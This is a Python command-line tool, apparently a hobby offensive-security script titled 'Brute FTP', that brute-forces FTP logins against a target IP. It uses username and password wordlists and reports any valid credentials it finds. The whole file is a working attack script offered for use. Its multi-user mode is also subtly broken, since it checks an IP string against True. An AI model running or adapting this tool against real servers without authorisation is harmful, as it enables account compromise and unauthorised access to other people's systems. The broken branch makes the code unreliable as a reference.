import ftplib
import argparse
import sys
from colorama import Fore
import os
from time import sleep

print("""

██████  ██████  ██    ██ ████████ ███████     ███████ ████████ ██████  
██   ██ ██   ██ ██    ██    ██    ██          ██         ██    ██   ██ 
██████  ██████  ██    ██    ██    █████       █████      ██    ██████  
██   ██ ██   ██ ██    ██    ██    ██          ██         ██    ██      
██████  ██   ██  ██████     ██    ███████     ██         ██    ██      
                   
                    Tool developed by TheMV and Whoami
                                     
""")

parser = argparse.ArgumentParser()
parser.add_argument('-i', dest='ip', help="IP to attack")
parser.add_argument('-u', dest='username', help="username to attack")
parser.add_argument('-U', dest='users', help="wordlist users")
parser.add_argument('-v', dest='verbosity', help="-v yes = verbosity on | -v no = verbosity off")
parser.add_argument('-w', dest='wordlist', help="wordlist attack")
args = parser.parse_args()

ip = ""
username = ""
users = ""
verbosity = ""
wordlist = ""

ip = args.ip
username = args.username
users = args.users
verbosity = args.verbosity
wordlist = args.wordlist


def ayuda():
    print("Usage: python3 ftp-brute.py -h")

def bruteOneUsers(ip, username, passwords):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(username, passwords)
        ftp.quit()
        print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,passwords))
    except KeyboardInterrupt:
        print("\nSaliendo...")
        sleep(1)
        exit()
    except:
        print(Fore.RED + "{}:{} -> Not Found".format(username, passwords))

def bruteOneUsersNotver(ip, username, passwords):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(username, passwords)
        ftp.quit()
        print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,passwords))
    except KeyboardInterrupt:
        print("\nSaliendo...")
        sleep(1)
        exit()
    except:
        pass

def BruteForceMultiUsers(ip, username, password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(username, password)
        ftp.quit()
        print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,password))
    except KeyboardInterrupt:
        print("\nSaliendo...")
        sleep(1)
        exit()
    except:
        print(Fore.RED + "{}:{} -> Not Found".format(username,password))

def BruteForceMultiUsersNotVer(ip, username, password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(username, password)
        ftp.quit()
        print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,password))
    except KeyboardInterrupt:
        print("\nSaliendo...")
        sleep(1)
        exit()
    except:
        pass
        

if ip == None:
    ayuda()

if username:
    if verbosity == "yes" or verbosity == "Yes" or verbosity == "YES" or verbosity == "y" or verbosity == "Y":
        print("Attack on the user {}\n".format(username))
        passwords = open(wordlist,'r')
        passwords = passwords.read().split('\n')
        for p in passwords:
            bruteOneUsers(ip, username, p)
    elif verbosity == "no" or verbosity == "No" or verbosity == "NO" or verbosity == "n" or verbosity == "N":
        print("Attack on the user {}\n".format(username))
        passwords = open(wordlist,'r')
        passwords = passwords.read().split('\n')
        for p in passwords:
            bruteOneUsersNotver(ip, username, p)

if ip == True:
    if users:
        ruta = os.path.exists(users)
        if ruta == True:
            if verbosity == "yes" or verbosity == "Yes" or verbosity == "YES" or verbosity == "y" or verbosity == "Y":
                print("[+] Starting Brute Force")
                usernames = open(users, 'r')
                usernames = usernames.read().split('\n')
                passwords = open(wordlist,'r')
                passwords = passwords.read().split('\n')
                for u in usernames:
                    for p in passwords:
                        BruteForceMultiUsers(ip, u, p)
            elif verbosity == "no" or verbosity == "No" or verbosity == "NO" or verbosity == "n" or verbosity == "N":
                print("[+] Starting Brute Force")
                usernames = open(users, 'r')
                usernames = usernames.read().split('\n')
                passwords = open(wordlist,'r')
                passwords = passwords.read().split('\n')
                for u in usernames:
                    for p in passwords:
                        BruteForceMultiUsersNotVer(ip, u, p)
        elif ruta == False:
            print(Fore.RED + "\n[-] Diccionario inexistente")
